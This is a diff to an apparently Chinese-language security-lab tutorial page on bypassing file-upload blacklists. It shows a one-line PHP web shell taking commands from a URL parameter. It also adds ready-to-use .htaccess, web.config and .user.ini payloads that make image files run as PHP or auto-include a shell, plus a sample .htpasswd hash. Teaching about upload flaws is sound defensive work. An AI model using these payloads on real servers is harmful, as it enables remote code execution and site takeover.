@@ -102,10 +102,6 @@ system($_GET[&#39;cmd&#39;]);
                             <li><code>webshell.pht</code> - 某些服务器会解析</li>
                             <li><code>webshell.php7</code> - PHP 7+ 版本可能支持</li>
                             <li><code>webshell.phtml</code> - 某些服务器会解析</li>
-                            <li><code>webshell.inc</code> - 某些配置下会被解析为PHP</li>
-                            <li><code>webshell.php~</code> - 波浪号后缀可能被忽略</li>
-                            <li><code>webshell.php.old</code> - 某些服务器会解析前面的.php</li>
-                            <li><code>webshell.php.bak</code> - 备份文件扩展名</li>
                         </ul>
                         <li>上传文件，由于扩展名不在黑名单中，会被成功上传</li>
                         <li>访问上传后的文件，例如：<code>http://localhost/zhaosec/upload/uploads/webshell.php5?cmd=whoami</code></li>
@@ -115,10 +111,42 @@ system($_GET[&#39;cmd&#39;]);
                     <ol>
                         <li>上传特殊配置文件，例如：</li>
                         <ul>
-                            <li><code>.htaccess</code> - Apache服务器配置文件，可用于修改文件解析规则</li>
-                            <li><code>web.config</code> - IIS服务器配置文件，可用于修改文件处理方式</li>
-                            <li><code>.user.ini</code> - PHP用户级配置文件，可用于执行PHP代码</li>
-                            <li><code>.htpasswd</code> - 基本认证密码文件，可能导致认证绕过</li>
+                            <li>
+                                <code>.htaccess</code> - Apache服务器配置文件，可用于修改文件解析规则
+                                <pre class="bg-dark text-light p-3 rounded mt-2"><code># 将所有文件解析为PHP
+AddType application/x-httpd-php .*
+
+# 或仅解析特定扩展名
+AddType application/x-httpd-php .jpg
+</code></pre>
+                            </li>
+                            <li>
+                                <code>web.config</code> - IIS服务器配置文件，可用于修改文件处理方式
+                                <pre class="bg-dark text-light p-3 rounded mt-2"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;configuration&gt;
+    &lt;system.webServer&gt;
+        &lt;handlers&gt;
+            &lt;add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule" 
+                 scriptProcessor="C:\php\php-cgi.exe" resourceType="File" /&gt;
+        &lt;/handlers&gt;
+    &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+</code></pre>
+                            </li>
+                            <li>
+                                <code>.user.ini</code> - PHP用户级配置文件，可用于执行PHP代码
+                                <pre class="bg-dark text-light p-3 rounded mt-2"><code># 自动预处理文件
+auto_prepend_file = "shell.php"
+
+# 或设置危险函数可用
+disable_functions =
+</code></pre>
+                            </li>
+                            <li>
+                                <code>.htpasswd</code> - 基本认证密码文件，可能导致认证绕过
+                                <pre class="bg-dark text-light p-3 rounded mt-2"><code>admin:$apr1$H4yGiGNg$zS1fWJ5I2F6j29SKY5z9q1
+</code></pre>
+                            </li>
                         </ul>
                         <li>配置文件生效后，可通过访问普通文件来执行PHP代码</li>
                     </ol>
